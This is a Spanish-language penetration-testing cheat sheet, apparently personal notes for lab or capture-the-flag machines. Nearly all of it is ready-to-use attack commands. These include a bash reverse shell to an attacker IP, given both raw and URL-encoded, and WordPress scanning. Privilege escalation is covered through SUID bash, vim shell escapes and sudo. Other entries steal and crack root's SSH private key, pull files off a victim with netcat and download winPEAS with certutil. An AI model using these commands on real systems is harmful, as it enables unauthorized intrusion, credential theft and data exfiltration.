## Para analizar páginas web que estén creadas con wordpress podemos realizar estos dos comandos:

```
wpscan –url http://ip
```
## Y en caso de que no veamos nada vulnerable, podemos probar a buscar posibles plugins vulnerables:

```
wpscan --plugins-version-detection aggressive --url http://192.168.0.5/wordpress
```

## Opciones para crear una shell inversa:

[revshell](https://www.revshells.com/)

```
 “/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.4/1234 0>&1'”

bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.16.37%2F9999%200%3E%261%27
 ```
 ## En caso de querer codificarla en url, podemos realizar el siguiente comando:
 ```
urlencode "/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.4/1234 0>&1'"
```

## Sacar hashes de ficheros zip:
```
zip2john muyconfidencial.zip > hash_muyconfidencial
```
## Para tener una mejor consola interactiva una vez hemos realizado nc -lvp 1234
```
SHELL=/bin/bash script -q /dev/null
Hacemos control +z
stty raw -echo && fg
escribimos reset
xterm
export TERM=xterm
```
(un máquina atacante usamos stty size para saber el tamaño de la terminal)
En la vicitma ejecutamos
```
stty rows x columns y
```
## Página donde ver como escalar privilegios con los binarios (sudo -l ):
[gtfobins](https://gtfobins.github.io/gtfobins/aws/#sudo)

## Visualizar todos los ficheros ordenados por directorios para ver los permisos:
```
ls -la /* | less
```
## Página donde se ven diferentes tipos de ataque:
[deephacking](https://deephacking.tech/)

## Ejemplo de uso para escalar priv con rutas absolutas:
```
sudo -u root /usr/bin/python3.11 /home/arasaka/randombase64.py
```
> **Nota:** pspy - Script que permite visualizar todos los procesos que se están ejecutando en el sistema sin ser root.

## Escalar priv por medio de SUID
Dar privilegios p.j 
/bin/bash u+s o (4777) 
Ejecutar el comando del ejemplo
bash -p 
> **Nota:** (la opción -p en bash (preserve privileges) le dice a Bash que mantenga los permisos de usuario efectivo). 

## Ejemplo de Búsqueda de Archivos SUID:
```
find / -perm -4000 -type f 2>/dev/null (para buscar ficheros) 
find / -perm -4000 2>/dev/null (para buscar directorios).
```
## Otro ejemplo pero con un editor como puede ser vim:
```
vim -c una vez dentro ejecutar: ':!/bin/sh'
```

## En algún supuesto caso de que tengamos posibilidad de ver ficheros como root sin serlo y necesitemos escalar a root, una de las posibilidades es entrar en:

> **Nota:** /root/.ssh/id_rsa y copiar la clave a nuestra máquina atacante para posteriormente hashear esa clave e intentar sacar la contraseña por el hash.
```
ssh2john ficherodondeguardamoslakey > salidaficherohasheado

john ficherohasheado –wordlist /usr/share/wordlist/rockyou
```
Para terminar, una vez obtengamos la contraseña nos podemos conectar desde la atacante usando el fichero con la clave privada
```
sudo ssh root@ip -i ficheroconlakey
```
Enviar ficheros por netcat (Victima)
```
nc -q 0 192.168.16.37 9999 < BurgerWithoutCheese.zip (atacante) nc -nvlp 9999 > BurgerWithoutCheese.zip
```

## Enviar el Archivo como Base64

```
base64 archivo.txt
base64 -d archivo_codificado.txt > archivo_recibido.txt
```

## Ver capacidades/capabilities/división de privilegios

```
getcap -r /
```

## Compartir ficheros con máquinas Windows:
```
certutil -urlcache -split -f http://192.168.200.3/winPEASx64.exe C:\Users\hacker\Documents\winpeas.exe
```


## Página donde ver ataque de fuerza bruta con hydra a diferentes tipos de login:
[Hydra Brute Force Login Attacks](https://www.manrajbansal.com/post/how-to-use-hydra-to-brute-force-login-forms)

## Escalada de privilegios mediante lxc
[HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
[Juggernaut](https://juggernaut-sec.com/lxd-container/)

## Página con muchas técnicas y ejemplos

[LostSec](https://lostsec.xyz)
